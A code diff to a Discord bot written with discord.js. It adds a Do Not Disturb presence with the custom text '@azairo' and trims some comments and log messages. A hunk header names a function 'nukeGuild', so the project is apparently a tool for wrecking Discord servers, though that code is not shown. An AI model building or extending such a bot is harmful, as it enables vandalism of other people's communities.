@@ -1,7 +1,7 @@
-const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');
 const fs = require('fs');
 
-// ---- LOAD TOKEN (foolproof) ----
+// ---- LOAD TOKEN ----
 let TOKEN = process.env.TOKEN;
 let OWNER_ID = process.env.OWNER_ID;
 
@@ -17,9 +17,8 @@ if (!TOKEN || !OWNER_ID) {
   }
 }
 
-// Debug: show token length (never print full token)
 console.log(`🔑 Token loaded, length: ${TOKEN.length}`);
-if (TOKEN.length < 50) console.error("⚠️ Token looks too short – check if you copied the full token");
+if (TOKEN.length < 50) console.error("⚠️ Token looks too short");
 
 const client = new Client({
   intents: [
@@ -86,6 +85,17 @@ async function nukeGuild(guild) {
 
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
+  
+  // Set status: DND + custom text "@azairo"
+  client.user.setPresence({
+    status: 'dnd',
+    activities: [{
+      name: '@azairo',
+      type: ActivityType.Custom,   // Custom status
+      state: '@azairo'             // The text shown
+    }]
+  });
+  console.log("✅ Status set to DND with custom text @azairo");
 });
 
 client.on('messageCreate', async (msg) => {
@@ -102,4 +112,4 @@ client.on('messageCreate', async (msg) => {
 client.login(TOKEN).catch(err => {
   console.error("❌ Login failed:", err.message);
   if (err.message.includes("token")) console.error("➡️ Your token is invalid. Reset it on Discord Developer Portal.");
-}); 
+});
